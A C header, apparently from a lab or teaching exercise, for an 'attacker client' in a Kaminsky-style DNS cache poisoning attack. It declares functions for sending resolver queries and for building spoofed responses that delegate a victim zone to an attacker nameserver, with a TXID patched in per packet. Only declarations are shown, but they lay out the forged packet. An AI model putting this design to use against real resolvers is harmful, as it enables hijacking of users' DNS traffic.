/*
 * spoof_dns.h
 *
 * DNS message construction for the attacker client: sending legitimate queries
 * to the resolver and building Kaminsky-style spoofed response payloads.
 */

#ifndef SPOOF_DNS_H
#define SPOOF_DNS_H

#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>

/* Build and send a single A query for qname to the recursive resolver. */
void send_a_query_to_resolver(const char *qname);

/*
 * Build a spoofed response payload for subdomain_name:
 *   QUESTION   : subdomain_name A IN
 *   ANSWER     : throwaway A record for subdomain_name
 *   AUTHORITY  : NS record delegating the victim zone to the attacker NS
 *   ADDITIONAL : glue A record for the attacker NS hostname
 *
 * The TXID is left zero; the caller patches it into the first two bytes of the
 * wire buffer per packet. On success *out_buf is malloc'ed (caller frees) and
 * *out_len holds its length.
 */
bool build_spoofed_response(const char *subdomain_name,
                            uint8_t **out_buf, size_t *out_len);

#endif /* SPOOF_DNS_H */
